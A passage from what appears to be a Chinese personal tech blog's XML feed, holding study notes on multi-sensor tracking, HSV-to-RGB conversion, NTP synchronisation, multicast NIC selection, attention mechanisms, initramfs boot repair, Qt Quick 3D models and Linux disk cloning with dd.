<li><a href="https://blog.csdn.net/a1424715994/article/details/103700983" target="_blank" rel="noopener">超简单全面的html图片自动轮播</a>,by 学习是人类进化的阶梯.</li>
<li><a href="https://blog.csdn.net/qq_51727668/article/details/120692167" target="_blank" rel="noopener">简单的HTML网页图片轮播自动切换</a>,by 时钟与夏蝉.</li>
<li><a href="https://www.73so.com/art/366.html" target="_blank" rel="noopener">利用CSS实现上下左右箭头</a>,by 墨初.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>多传感器多目标跟踪方法研究学习笔记</title>
    <url>/2024/09/28/%E5%A4%9A%E4%BC%A0%E6%84%9F%E5%99%A8%E5%A4%9A%E7%9B%AE%E6%A0%87%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95%E7%A0%94%E7%A9%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>最近遇到一个问题，需要将多传感器多目标跟踪获得的航迹进行关联，因此学习研究一下。</p>
<h1 id="关键技术"><a href="#关键技术" class="headerlink" title="关键技术"></a>关键技术</h1><blockquote>
<p>分布式多传感器多目标跟踪涉及的目标跟踪、传感器配准、航迹关联、数据融合4项关键技术。</p>
</blockquote>
<h2 id="目标跟踪"><a href="#目标跟踪" class="headerlink" title="目标跟踪"></a>目标跟踪</h2><p>目标跟踪是指利用传感器获得的带噪声量测数据，对目标的状态和个数进行估计的过程。</p>
<p>目标跟踪按目标探测个数可分为单目标跟踪和多目标跟踪，通常它们都基于贝叶斯框架进行递归滤波。</p>
<h3 id="单目标跟踪"><a href="#单目标跟踪" class="headerlink" title="单目标跟踪"></a>单目标跟踪</h3><h3 id="多目标跟踪"><a href="#多目标跟踪" class="headerlink" title="多目标跟踪"></a>多目标跟踪</h3><h2 id="传感器配准"><a href="#传感器配准" class="headerlink" title="传感器配准"></a>传感器配准</h2><blockquote>
<p>在分布式多传感器多目标跟踪过程中，需要把来自多个传感器的数据转换到相同的时空参照系中。由于不同传感器传输速率及采样周期不同，而且存在传感器系统偏差和量测误差，直接进行转换会降低数据融合精度，因此在对多传感器数据处理时需要进行传感器时空配准。</p>
</blockquote>
<h3 id="时间配准"><a href="#时间配准" class="headerlink" title="时间配准"></a>时间配准</h3><blockquote>
<p>时间配准就是将各传感器对同一目标的异步量测信息配准到同一时刻。</p>
</blockquote>
<h3 id="空间配准"><a href="#空间配准" class="headerlink" title="空间配准"></a>空间配准</h3><blockquote>
<p>空间配准是利用多传感器对空间公共目标的探测信息对传感器的系统偏差进行估计和补偿的过程，它可以提高信息融合精度。</p>
</blockquote>
<h2 id="航迹关联"><a href="#航迹关联" class="headerlink" title="航迹关联"></a>航迹关联</h2><blockquote>
<p>由于传感器间的探测区域存在重叠，来自不同系统的航迹可能代表同一目标。因此，如何找出同一目标对应的航迹就是分布式数据融合系统中的航迹关联问题。</p>
</blockquote>
<blockquote>
<p>航迹关联算法主要分为两类，一类是基于统计类的方法，一类是基于模糊数学的方法。</p>
</blockquote>
<h2 id="数据融合"><a href="#数据融合" class="headerlink" title="数据融合"></a>数据融合</h2><blockquote>
<p>分布式多传感器多目标跟踪又称分布式多传感器数据融合。在该系统中，各局部传感器首先基于单传感器多目标跟踪算法，形成各自目标航迹，<br>接着各传感器将目标航迹送入融合中心完成时空配准与航迹关联，然后融合中心基于某种融合准则对来自同一目标的航迹进行估计融合，最终形成稳定、<br>高精度的全局航迹。</p>
</blockquote>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://radars.ac.cn/article/doi/10.12000/JR22111" target="_blank" rel="noopener">分布式多传感器多目标跟踪方法综述</a>,by 曾雅俊, 王俊, 魏少明, 等.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title>HSV转RGB的效率问题探讨</title>
    <url>/2024/10/12/HSV%E8%BD%ACRGB%E7%9A%84%E6%95%88%E7%8E%87%E9%97%AE%E9%A2%98%E6%8E%A2%E8%AE%A8/</url>
    <content><![CDATA[<p>最近朋友遇到一个技术难题，我也没相关经验，只能记录以下，方便以后解决。</p>
<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>朋友想高效地在一块嵌入式的板子上实现 640*480 HSV格式的图片转换成 RGB格式的图片，要求处理时延不能超过20ms。</p>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>朋友试了很多中解决方案，包括：</p>
<ul>
<li>使用OpenCV的cvtColor函数，性能太差，可能是嵌入式板子的CPU处理器性能差的原因。</li>
<li>使用OpenGL进行图像格式转换，性能还是不够。</li>
<li>采用GPU加速图像处理，性能还是不够，GPU可能能够快速处理图像，但是图像数据在CPU和GPU之间的数据搬运也很耗时。</li>
<li>使用OpenGL帧缓存双缓冲，性能还是不够</li>
</ul>
<p>最后建议优化HSV转RGB格式的算法，提高CPU执行效率。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/shandianfengfan/article/details/120600453" target="_blank" rel="noopener">数字图像处理——RGB与HSV图像互相转换原理</a>,by 萌萌哒程序猴.</li>
<li><a href="https://blog.csdn.net/niu2212035673/article/details/78932454" target="_blank" rel="noopener">OpenGL帧缓存</a>,by 先锋小牛.</li>
<li><a href="https://blog.csdn.net/u010429424/article/details/76577399" target="_blank" rel="noopener">OpenCV 自学笔记21. RGB色彩空间和HSV色彩空间的理解</a>,by 两鬓已不能斑白.</li>
<li><a href="https://blog.csdn.net/qq_40243750/article/details/136028179" target="_blank" rel="noopener">opencv中使用cuda加速图像处理</a>,by 我是一个对称矩阵.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>NTP协议学习笔记</title>
    <url>/2024/10/30/NTP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>最近遇到一个问题，需要程序进行严格的时间同步，因此学习一下网络时间协议。</p>
<h1 id="NTP同步原理"><a href="#NTP同步原理" class="headerlink" title="NTP同步原理"></a>NTP同步原理</h1><blockquote>
<p>网络时间协议NTP（Network Time Protocol）是TCP/IP协议族里面的一个应用层协议，用来使客户端和服务器之间进行时钟同步，提供高精准度的时间校正。NTP服务器从权威时钟源（例如原子钟、GPS）接收精确的协调世界时UTC，客户端再从服务器请求和接收时间。<br>NTP基于UDP报文进行传输，使用的UDP端口号为123。</p>
</blockquote>
<p>NTP最典型的授时方式是Client/Server方式:</p>
<ol>
<li>客户端首先向服务端发送一个NTP请求报文，其中包含了该报文离开客户端的时间戳t1;</li>
<li>NTP请求报文到达NTP服务器，此时NTP服务器的时刻为t2。当服务端接收到该报文时，NTP服务器处理之后，于t3时刻发出NTP应答报文。该应答报文中携带报文离开NTP客户端时的时间戳t1、到达NTP服务器时的时间戳t2、离开NTP服务器时的时间戳t3；</li>
<li>客户端在接收到响应报文时，记录报文返回的时间戳t4。</li>
</ol>
<p>客户端用上述4个时间戳参数就能够计算出2个关键参数：</p>
<ul>
<li>NTP报文从客户端到服务器的往返延迟delay。</li>
</ul>
<p>$delay=(t_4-t_1)-(t_3-t_2)$</p>
<ul>
<li>客户端与服务端之间的时间差offset。</li>
</ul>
<p>联立方程组：</p>
<p>$t_2=t_1+offset+delay/2$</p>
<p>$t_4=t_3+offset+delay/2$</p>
<p>可得：</p>
<p>$offset=((t_2-t_1)+(t_3-t_4))/2$</p>
<p>NTP客户端根据计算得到的offset来调整自己的时钟，实现与NTP服务器的时钟同步。</p>
<h1 id="NTP时间同步频率"><a href="#NTP时间同步频率" class="headerlink" title="NTP时间同步频率"></a>NTP时间同步频率</h1><p>NTP时间同步频率修改请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/qq_43211632/article/details/109157974" target="_blank" rel="noopener">windows修改ntp同步时间间隔</a></li>
</ul>
<h1 id="NTP时间同步精度"><a href="#NTP时间同步精度" class="headerlink" title="NTP时间同步精度"></a>NTP时间同步精度</h1><p>打开站点 <a href="https://time.is/" target="_blank" rel="noopener">https://time.is/</a> 可查看机器的时间精度。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://cloud.tencent.com/developer/article/2361936" target="_blank" rel="noopener">六千字详细图解网络时间协议（NTP），带你领略NTP的魅力！</a>,by 网络技术联盟站.</li>
<li><a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/NTP.html" target="_blank" rel="noopener">什么是NTP？</a>,by 高洋洋.</li>
<li><a href="https://www.syn029.com/h-nd-343.html" target="_blank" rel="noopener">北斗授时原理及应用</a>,by 西安同步.</li>
<li><a href="https://www.syn029.com/h-nd-1506.html" target="_blank" rel="noopener">各种Windows系统ntp客户端配置详解</a>,by 西安同步.</li>
<li><a href="https://blog.csdn.net/qq_43211632/article/details/109157974" target="_blank" rel="noopener">windows修改ntp同步时间间隔</a>,by 梳碧湖的少年.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机网络</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>多网卡收UDP组播的问题分析</title>
    <url>/2024/10/27/%E5%A4%9A%E7%BD%91%E5%8D%A1%E6%94%B6UDP%E7%BB%84%E6%92%AD%E7%9A%84%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>最近遇到一个问题，某个程序默认使用第一个网卡绑定组播地址，如果网卡顺序不对，将导致无法从组播地址上接收和发送数据。因此，必须指定某个网口绑定一个组播地址。具体方法有两种：</p>
<ul>
<li>调整网络高级设置，通过调整网卡顺序，使组播地址绑定在正确的网卡上</li>
<li>修改网卡跃点数，通过修改网卡跃点数，使组播地址绑定在正确的网卡上</li>
</ul>
<p>下面重点介绍第二种方法，修改网卡跃点数来调整组播地址绑定的网卡。</p>
<p>所谓“跃点”，即路由。一个路由为一个跃点。数据传输过程中需要经过多个网络，每个被经过的网络设备点（有能力路由的）叫做一个跃点，地址就是它的IP。</p>
<p>如果电脑中存在多个连接，哪个连接的跃点数小，哪个优先级就高。多播地址就会绑定在跃点数最小的网卡上。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://huangwang.github.io/2024/03/25/Windows%E5%92%8CLinux%E6%9F%A5%E7%9C%8B%E7%BB%84%E6%92%AD%E9%80%9A%E4%BF%A1%E7%9A%84%E6%96%B9%E6%B3%95/">Windows和Linux查看组播通信的方法</a>,by huangwang.</li>
<li><a href="https://www.cnblogs.com/xiaouisme/p/12658554.html" target="_blank" rel="noopener">多网卡的情况下收udp组播数据的坑</a>,by 小鼬就是我.</li>
<li><a href="https://stackoverflow.com/questions/11234671/multiple-multicast-on-multiple-interfaces" target="_blank" rel="noopener">multiple multicast on multiple interfaces</a>,by stackoverflow.</li>
<li><a href="https://blog.csdn.net/zipack/article/details/78143548" target="_blank" rel="noopener">Win10：如何修改双网卡的优先级？</a>,by xosg.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>深度学习中注意力机制学习笔记</title>
    <url>/2024/11/03/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>学习理解注意力机制的目的是为了更好的掌握深度学习模型，指导实践。</p>
<h1 id="注意力机制的优点"><a href="#注意力机制的优点" class="headerlink" title="注意力机制的优点"></a>注意力机制的优点</h1><p>之所以要引入 Attention 机制，主要是3个原因：</p>
<ul>
<li>参数少</li>
</ul>
<p>模型复杂度跟 CNN、RNN 相比，复杂度更小，参数也更少。所以对算力的要求也就更小。</p>
<ul>
<li>速度快</li>
</ul>
<p>Attention 解决了 RNN 不能并行计算的问题。Attention机制每一步计算不依赖于上一步的计算结果，因此可以和CNN一样并行处理。</p>
<ul>
<li>效果好</li>
</ul>
<p>在 Attention 机制引入之前，有一个问题大家一直很苦恼：长距离的信息会被弱化，就好像记忆能力弱的人，记不住过去的事情是一样的。</p>
<p>Attention 是挑重点，就算文本比较长，也能从中间抓住重点，不丢失重要的信息。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://easyaitech.medium.com/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82-attention-%E6%9C%AC%E8%B4%A8%E5%8E%9F%E7%90%86-3%E5%A4%A7%E4%BC%98%E7%82%B9-5%E5%A4%A7%E7%B1%BB%E5%9E%8B-e4fbe4b6d030" target="_blank" rel="noopener">一文看懂 Attention（本质原理+3大优点+5大类型）</a>,by easyAI-人工智能知识库.</li>
<li><a href="https://blog.csdn.net/weixin_42110638/article/details/134011134" target="_blank" rel="noopener">一文搞定注意力机制（Attention）</a>,by markconca的博客.</li>
<li><a href="https://www.cnblogs.com/jins-note/p/13056604.html" target="_blank" rel="noopener">注意力机制（Attention mechanism）基本原理详解及应用</a>,by Jerry_Jin.</li>
<li><a href="https://blog.csdn.net/mawenqi0729/article/details/80698350" target="_blank" rel="noopener">什么是词向量？（NPL入门）</a>,by mawenqi0729.</li>
<li><a href="https://www.getui.com/college/2021053176" target="_blank" rel="noopener">词向量Word Embedding原理及生成方法</a>,by getui.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6" target="_blank" rel="noopener">注意力机制</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux重启后进入initramfs导致无法开机的解决方案</title>
    <url>/2024/11/14/Linux%E9%87%8D%E5%90%AF%E5%90%8E%E8%BF%9B%E5%85%A5initramfs%E5%AF%BC%E8%87%B4%E6%97%A0%E6%B3%95%E5%BC%80%E6%9C%BA%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>最近遇到 Linux 重启后进入 initramfs 导致无法开机的问题，虽然问题没有解决，但是记录一下过程。</p>
<h1 id="通用解决方法"><a href="#通用解决方法" class="headerlink" title="通用解决方法"></a>通用解决方法</h1><p>在initramfs命令行接口下，输入如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 使用如下命令查看和识别磁盘、分区或文件系统的信息</span><br><span class="line">blkid</span><br><span class="line"></span><br><span class="line"># fsck命令是用于检查和修复Linux文件系统中的错误</span><br><span class="line">fsck -y -t ext4 &#x2F;dev&#x2F;sda1</span><br></pre></td></tr></table></figure>

<p>由于无法修复文件系统中错误，linux 还是无法开机。</p>
<h1 id="SuperBlock修复"><a href="#SuperBlock修复" class="headerlink" title="SuperBlock修复"></a>SuperBlock修复</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo fdisk -l</span><br><span class="line">sudo fsck.ext4 -v &#x2F;dev&#x2F;xxx</span><br><span class="line">sudo mke2fs -n &#x2F;dev&#x2F;xxx	</span><br><span class="line">sudo e2fsck -b block_number &#x2F;dev&#x2F;xxx</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/weixin_44002151/article/details/134212707" target="_blank" rel="noopener">Ubuntu重启后进入initramfs导致无法开机解决方案</a>,by 修己xj.</li>
<li><a href="https://blog.csdn.net/z1026544682/article/details/100539669" target="_blank" rel="noopener">linux操作系统故障处理-ext4文件系统超级块损坏修复</a>,by zhangatong.</li>
<li><a href="https://linuxexpresso.wordpress.com/2010/03/31/repair-a-broken-ext4-superblock-in-ubuntu/" target="_blank" rel="noopener">HOWTO: Repair a broken Ext4 Superblock in Ubuntu</a>,by linuxexpresso.</li>
<li><a href="https://blog.csdn.net/u014651560/article/details/119145302" target="_blank" rel="noopener">linux 检测SSD寿命</a>,by 高压锅_1220.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt_Quick_3D加载3d模型的方法</title>
    <url>/2024/11/14/Qt-Quick-3D%E5%8A%A0%E8%BD%BD3d%E6%A8%A1%E5%9E%8B%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>最近工作中使用的一个基于QT开发三维程序中有很多以 .mesh 扩展名结尾的三维模型，搜索了一下，原来是 QtQuick3D 使用的专有三维模型格式。</p>
<blockquote>
<p>QtQuick3D 附带Balsam导入工具，用于将常见格式转换为QtQuick3D支持的格式。</p>
</blockquote>
<blockquote>
<p>Balsam的目的是让可以轻松获取在常用工具（Blender，Maya，或3dsMax）中创建的资源，并在QtQuick3D中使用它们。</p>
</blockquote>
<blockquote>
<p>通过balsamui导出mesh文件和qml文件。</p>
</blockquote>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/zjgo007/article/details/122922420" target="_blank" rel="noopener">Qt Quick 3D系列（一）：加载3d模型</a>,by 喵喵叫的猴.</li>
<li><a href="https://blog.csdn.net/gongjianbo1992/article/details/106744754" target="_blank" rel="noopener">Qt Quick 3D模块初探</a>,by 龚建波.</li>
<li><a href="https://blog.csdn.net/zjgo007/article/details/122878344" target="_blank" rel="noopener">Qt Quick 3D中将3D场景(如.obj)转换为.mesh</a>,by 喵喵叫的猴.</li>
<li><a href="https://blog.csdn.net/weixin_41392061/article/details/131785107" target="_blank" rel="noopener">12、Qt Quick 3D —– 模型加载</a>,by weixin_41392061.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
        <tag>QT</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux磁盘克隆方法</title>
    <url>/2024/11/19/Linux%E7%A3%81%E7%9B%98%E5%85%8B%E9%9A%86%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>最近公司的一台 CentOS 服务器需要克隆一下，以便在另一台服务器或者虚拟机上运行，因此，研究了一下Linux的磁盘克隆方法。</p>
<h1 id="基本常识"><a href="#基本常识" class="headerlink" title="基本常识"></a>基本常识</h1><h2 id="UEFI-与-BIOS-区别"><a href="#UEFI-与-BIOS-区别" class="headerlink" title="UEFI 与 BIOS 区别"></a>UEFI 与 BIOS 区别</h2><p>UEFI引导与BIOS引导在结构上的区别：</p>
<ul>
<li><p>BIOS引导的结构相对简单，由3个部分组成：BIOS程序、MBR（主引导记录）和操作系统引导程序。其中BIOS程序是由计算机制造商预装在ROM芯片中的，MBR是位于磁盘的名列前茅个扇区，用于存储操作系统引导程序的位置信息，操作系统引导程序则是由用户安装的操作系统自带的。</p>
</li>
<li><p>UEFI引导的结构相对复杂，由多个部分组成：UEFI固件、GPT（GUID分区表）、EFI系统分区、操作系统引导程序。其中UEFI固件是由计算机制造商预装在主板上的，GPT是磁盘分区表，EFI系统分区是用于存储操作系统引导程序和其他UEFI应用程序的特殊分区，操作系统引导程序则是由用户安装的操作系统自带的。</p>
</li>
</ul>
<h2 id="MBR-Master-Boot-Record-主引导记录"><a href="#MBR-Master-Boot-Record-主引导记录" class="headerlink" title="MBR (Master Boot Record,主引导记录)"></a>MBR (Master Boot Record,主引导记录)</h2><p>主引导扇区是硬盘的第一扇区。它由三个部分组成，主引导记录MBR、硬盘分区表DPT和硬盘有效标志。在总共512字节的主引导扇区里MBR占446个字节，偏移地址0000H–0088H），它负责从活动分区中装载，并运行系统引导程序；第二部分是Partition table区（DPT分区表），占64个字节；第三部分是Magic number，占2个字节。</p>
<h2 id="GPT-分区格式"><a href="#GPT-分区格式" class="headerlink" title="GPT 分区格式"></a>GPT 分区格式</h2><p>GPT分区格式包含传统MBR（主引导记录）、分区表头、分区表、备份分区表头、备份分区表以及数据区。</p>
<h1 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h1><ul>
<li><p>fdisk, 查看磁盘分区情况，或者用于磁盘分区，注意 fdisk 只支持 MBR 分区格式，只支持 2T 以下的磁盘</p>
</li>
<li><p>lsblk, 查看磁盘分区情况</p>
</li>
<li><p>blkid, 获取分区 UUID ，用于编辑 /etc/fstab 永久挂在分区</p>
</li>
<li><p>parted, 查看磁盘分区情况，或者用于磁盘分区，支持 MBR 或者 GPT 分区格式，支持 2T 以上的磁盘</p>
</li>
<li><p>mkfs.ext4, 用于分区后的磁盘文件系统格式化</p>
</li>
<li><p>mount, 挂载磁盘分区</p>
</li>
<li><p>dd, 磁盘克隆的工具</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 读取硬盘的mbr扇区</span><br><span class="line">dd if&#x3D;&#x2F;dev&#x2F;sdb of&#x3D;mbr.bin bs&#x3D;512 count&#x3D;1 | hexdump</span><br><span class="line">dd if&#x3D;&#x2F;dev&#x2F;sdb of&#x3D;mbr.bin bs&#x3D;1 count&#x3D;512 | hexdump</span><br></pre></td></tr></table></figure>

<p>以上命令的使用方法请参考：</p>
<ul>
<li><a href="https://gnu-linux.readthedocs.io/zh/latest/Chapter01/fdisk.html" target="_blank" rel="noopener">fdisk 管理磁盘分区</a></li>
</ul>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="目标磁盘大于原磁盘"><a href="#目标磁盘大于原磁盘" class="headerlink" title="目标磁盘大于原磁盘"></a>目标磁盘大于原磁盘</h2><p>需要磁盘克隆的服务器，其硬盘有4T大小，但只使用了不到512G，用于克隆的目标磁盘同样有4T大小。因此考虑先生成原磁盘的镜像文件，再向目标磁盘克隆。具体步骤如下：</p>
<ul>
<li>挂载目标磁盘，GPT分区，并ext4格式化。</li>
<li>生成原磁盘的镜像文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># &#x2F;media&#x2F;nvme1n1 为目标磁盘挂载目录</span><br><span class="line">dd if&#x3D;&#x2F;dev&#x2F;nvme0n1 status&#x3D;progress bs&#x3D;32M | gzip -c -9 &gt; &#x2F;media&#x2F;nvme1n1&#x2F;nvme0n1.dd.gz</span><br></pre></td></tr></table></figure>
<ul>
<li>将生成的原磁盘镜像文件复制到原磁盘的 root 目录</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv &#x2F;media&#x2F;nvme1n1&#x2F;nvme0n1.dd.gz &#x2F;root</span><br></pre></td></tr></table></figure>

<ul>
<li>使用原磁盘的镜像文件克隆磁盘</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gzip -dc &#x2F;root&#x2F;nvme0n1.dd.gz | dd of&#x3D;&#x2F;dev&#x2F;nvme1n1</span><br></pre></td></tr></table></figure>

<h2 id="目标磁盘小于原磁盘"><a href="#目标磁盘小于原磁盘" class="headerlink" title="目标磁盘小于原磁盘"></a>目标磁盘小于原磁盘</h2><p>如果目标磁盘小于原磁盘，就不能简单的使用dd命令进行全盘克隆了。好在原磁盘实际使用的空间不大，因此，采用的步骤如下：</p>
<ul>
<li>在目标磁盘安装同样的CentOS操作系统</li>
<li>使用 dd 命令克隆 root 分区</li>
</ul>
<p>对于 home 分区，应根据不同情况不同处理：</p>
<ul>
<li>如果 home 分区文件系统占有空间相对较小，可使用 tar 命令压缩 home 分区的文件，然后解压到目标磁盘的 home 分区，并更改 home 分区文件夹的所有者。</li>
<li>如果 home 分区文件系统占用空间相对很大，那干脆用 dd 命令克隆 home 分区更省事。</li>
<li>如果 home 分区为 ext 文件系统，可考虑使用 resize2f 缩小文件系统，在缩小文件系统后，在使用 fdsik 或者 parted 缩小 home 分区大小，没有问题后，考虑使用 dd 命令克隆 home 分区。</li>
<li>如果 home 分区为 xfs 文件系统，由于 xfs 文件系统不支持缩小，可以考虑使用 xfsdump 备份，等缩小 home 分区后，使用 xfsrestore 还原 home 分区。</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/renshengdezheli/p/13941563.html" target="_blank" rel="noopener">linux下使用fdisk进行磁盘分区详解</a>,by 人生的哲理.</li>
<li><a href="https://gnu-linux.readthedocs.io/zh/latest/Chapter01/fdisk.html" target="_blank" rel="noopener">fdisk 管理磁盘分区</a>,by gnu.</li>
<li><a href="https://www.cnblogs.com/xiaocheng7/p/9462329.html" target="_blank" rel="noopener">UEFI是什么意思？UEFI和BIOS的区别是什么？</a>,by  小橙7.</li>
<li><a href="UEFI是什么？与BIOS的区别在哪？">UEFI是什么？与BIOS的区别在哪？</a>,by 平凡而伟大(心之所向).</li>
<li><a href="https://news.mydrivers.com/1/503/503560.htm" target="_blank" rel="noopener">装机、做系统必备：秒懂MBR和GPT分区表</a>,by 张伟.</li>
<li><a href="https://blog.csdn.net/caodinke/article/details/105347503" target="_blank" rel="noopener">GPT 磁盘分区格式简介及解析示例</a>,by 一柯.</li>
<li><a href="https://uefi.org/specs/UEFI/2.10/05_GUID_Partition_Table_Format.html" target="_blank" rel="noopener">GUID Partition Table (GPT) Disk Layout</a>,by uefi.</li>
<li><a href="https://zuyunfei.com/2015/06/04/linux-dd/" target="_blank" rel="noopener">Linux下使用dd命令备份硬盘</a>,by zuyunfei.</li>
<li><a href="https://www.cyberciti.biz/faq/how-to-gzip-and-keep-original-file-on-unix-or-linux-command-line/" target="_blank" rel="noopener">How to gzip and keep original file on Unix or Linux command line</a>,by Vivek Gite .</li>
<li><a href="https://www.cnblogs.com/larry1024/p/17645208.html" target="_blank" rel="noopener">BIOS 与 UEFI 引导流程</a>,by LARRY1024.</li>
<li><a href="https://www.cnblogs.com/sddai/p/10615745.html" target="_blank" rel="noopener">LVM原理与实现</a>,by 戴思达.</li>
<li><a href="https://blog.csdn.net/mshxuyi/article/details/106476068" target="_blank" rel="noopener">CentOS 7 调整 XFS 格式的 LVM 分区大小</a>,by Tom Ma.</li>
<li><a href="https://blog.csdn.net/shengjie87/article/details/107077975" target="_blank" rel="noopener">CentOS 8 逻辑卷管理LVM详解（扩容、快照等）</a>,by 把倒立的世界腾空.</li>
<li><a href="https://blog.51cto.com/u_16099257/10596015" target="_blank" rel="noopener">resize2fs 缩小根分区 linux缩小根分区大小</a>,by 编程小匠人.</li>
<li><a href="https://www.cnblogs.com/kevingrace/p/5825963.html" target="_blank" rel="noopener">Linux下对LVM逻辑卷分区大小调整 [针对xfs和ext4文件系统]</a>,by 散尽浮华.</li>
<li><a href="https://anuoua.github.io/2019/03/04/Linux%E6%97%A0%E6%8D%9F%E8%B0%83%E6%95%B4%E5%88%86%E5%8C%BA%E5%A4%A7%E5%B0%8F/" target="_blank" rel="noopener">Linux无损调整分区大小</a>,by anuoua.</li>
<li><a href="https://blog.orchidflower.cn/2022/12/01/Expand-Linux-Partition-without-Data-Loss/" target="_blank" rel="noopener">无损扩容Linux磁盘分区容量</a>,by orchidflower.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>系统设计面试：内幕指南读书笔记</title>
    <url>/2024/11/20/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%EF%BC%9A%E5%86%85%E5%B9%95%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>一本好书，值得学习。</p>
<h1 id="系统设计面试：内幕指南读书笔记（第一卷）"><a href="#系统设计面试：内幕指南读书笔记（第一卷）" class="headerlink" title="系统设计面试：内幕指南读书笔记（第一卷）"></a>系统设计面试：内幕指南读书笔记（第一卷）</h1><h2 id="第01章：从0到百万用户"><a href="#第01章：从0到百万用户" class="headerlink" title="第01章：从0到百万用户"></a>第01章：从0到百万用户</h2><blockquote>
<p>垂直扩展，又称为“纵向扩展”，指的是通过增加单个服务器的计算能力（CPU、RAM等）来提升其性能。<br>水平扩展，又称为“横向扩展”，允许通过向资源池中添加更多服务器来进行扩展。</p>
</blockquote>
<blockquote>
<p>引用自维基百科：“数据库复制可适用于许多数据库管理系统，通常在原始数据库(master)与副本数据库(slaves)之间建立主/从关系”。</p>
</blockquote>
<blockquote>
<p>主数据库通常仅支持写的操作。从数据库从主数据库中复制数据并且仅支持读操作。所有修改数据的命令，如：insert，delete，update 都必须发送到主数据库。</p>
</blockquote>
<blockquote>
<p>缓存是一个临时存储区域，用于将昂贵的响应结果或频繁的访问数据存储在内存中，以便之后的请求能被更快的处理。</p>
</blockquote>
<blockquote>
<p>CDN（内容分发网络）是一个由地理上分散的服务器组成的网络，用于提供静态内容。CDN服务器缓存静态内容，如：图片、视频、CSS、JavaScript文件等。</p>
</blockquote>
<blockquote>
<p>无状态的Web层</p>
</blockquote>
<blockquote>
<p>消息队列是一个持久性组件，存储在内存中，支持异步通信，它充当缓冲区并分发异步请求。消息队列的基础架构非常简单，输入服务，被称为生产者/发布者，创建消息，并将它们发送到消息队列中。其他服务或服务器，称为消费者/订阅者，连接到队列，并执行消息定义的动作。</p>
</blockquote>
<h2 id="第02章：粗略估算"><a href="#第02章：粗略估算" class="headerlink" title="第02章：粗略估算"></a>第02章：粗略估算</h2><blockquote>
